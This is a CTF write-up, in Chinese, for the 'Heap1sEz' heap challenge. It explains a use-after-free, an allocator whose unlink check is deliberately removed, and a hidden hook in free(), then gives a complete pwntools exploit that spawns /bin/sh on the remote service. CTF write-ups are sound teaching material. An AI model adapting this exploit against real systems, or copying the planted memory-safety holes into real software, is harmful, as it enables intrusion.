# Heap1sEz

## 题目简述

题面是 `Heap is easy :)`，附件包含二进制、libc 和自定义 malloc 源码。主程序是 16 个 note 的堆菜单，`add/delete/edit/show` 操作都通过全局 `notes[16]` 和 `note_size[16]` 管理 chunk。`delete()` 只调用 `free(notes[index])`，没有把指针置空，因此释放后的指针仍会通过 `edit()` 和 `show()` 的空指针检查。

```c
char* notes[16];
int note_size[16];

void delete() {
    scanf("%u", &index);
    if (index >= 16 || notes[index] == NULL) return;
    free(notes[index]);
}

void edit() {
    scanf("%u", &index);
    if (index >= 16 || notes[index] == NULL) return;
    read(0, notes[index], note_size[index]);
}
```

自定义 allocator 的 `unlink_chunk()` 注释掉了 `fd/bk` 双向链表一致性检查；程序还存在隐藏菜单 `gift()`，可写全局 `hook`，而 `free()` 在 hook 非空时会调用 `(*hook)(mem)`。

## 解题过程

详细过程可参考：[https://summ2.link/categories/CTF/heap1sEz/](https://summ2.link/categories/CTF/heap1sEz/)

附件主程序的关键问题是 `delete()` 只调用 `free(notes[index])`，没有把指针置空；`edit()` 和 `show()` 只检查 `notes[index] == NULL`，所以释放后的 chunk 仍可读写：

```c
void delete() {
    unsigned int index;
    scanf("%u", &index);
    if (index >= 16 || notes[index] == NULL)
        return;
    free(notes[index]);
}

void edit() {
    unsigned int index;
    scanf("%u", &index);
    if (index >= 16 || notes[index] == NULL)
        return;
    read(0, notes[index], note_size[index]);
}

void show() {
    unsigned int index;
    scanf("%u", &index);
    if (index >= 16 || notes[index] == NULL)
        return;
    puts(notes[index]);
}
```

自定义 malloc 的 `unlink_chunk()` 只做了 size 检查，`fd->bk == p` 和 `bk->fd == p` 的安全检查被注释掉，因此可以通过伪造 freed chunk 的 `fd/bk` 触发 unsafe unlink：

```c
static void unlink_chunk(mchunkptr p) {
    if (chunksize(p) != prev_size(next_chunk(p)))
        malloc_printerr("corrupted size vs. prev_size");

    mchunkptr fd = p->fd;
    mchunkptr bk = p->bk;

    // fd->bk / bk->fd consistency check is removed
    fd->bk = bk;
    bk->fd = fd;
}
```

程序还藏了一个菜单项 `6`，可以把任意地址写入全局 `hook`。`free()` 开头如果发现 `hook != NULL` 就直接调用它，因此泄露 libc 后把 hook 写成 `system`，再释放内容为 `/bin/sh` 的 chunk 即可：

```c
void gift() {
    printf("give me a hook\n");
    if (scanf("%p", &hook) <= 0)
        _exit(1);
}

void free(void *mem) {
    if (__builtin_expect(hook != NULL, 0)) {
        (*hook)(mem);
        return;
    }
    ...
}
```

```python
from pwn import *
context.log_level = "debug"
context.arch = "amd64"
context.terminal = ['konsole', '-e', 'sh', '-c']
libc = ELF("./libc.so.6")
#p = process("./vuln")
HOST = "challenge-host"
PORT = 0
p = remote(HOST, PORT)
#gdb.attach(p)
def add(index,size):
    p.sendline(b"1")
    p.sendlineafter("Index:",str(index))
    p.sendlineafter("Size: ",str(size))
def dele(index):
    p.sendline(b"2")
    p.sendlineafter("Index:",str(index))
def edit(index,content):
    p.sendline(b"3")
    p.sendlineafter("Index:",str(index))
    p.sendlineafter("Content: ",content)
def show(index):
    p.sendline(b"4")
    p.sendlineafter("Index:",str(index))
add(2,8)
add(3,8)
dele(2)
dele(3)
show(2)
bss_addr = u64(p.recvuntil('\x0a\x77\x65',drop=True)[-6:].ljust(8, b'\x00'))
elfbase = bss_addr + 0x8 - 0x3810
print("bss:",hex(bss_addr))
note = elfbase + 0x3880
puts = elfbase + 0x3768
add(0,16)
add(1,16)
dele(0)
edit(0,p64(note-0x18)+p64(puts))
dele(1)
show(0)
puts_addr = u64(p.recvuntil('\x0a\x77\x65',drop=True)[-6:].ljust(8, b'\x00'))
libc_base = puts_addr - libc.sym["puts"]
sys_addr = libc_base + libc.sym["system"]
add(6,8)
edit(6,b"/bin/sh")
p.sendline(b"6")
p.sendlineafter(b"give me a hook\n",hex(sys_addr))
dele(6)
p.interactive()
```

## 方法总结

堆题 WP 不能只留下 exploit，至少要写清 chunk 生命周期、泄露 primitive、任意写目标和最终触发点。本题的识别信号是释放后不清空指针、自定义 allocator 缺少 unlink 安全检查、以及 `free()` 前置 hook；这三点组合后，UAF 可以转成 libc 泄露和 `system("/bin/sh")`。
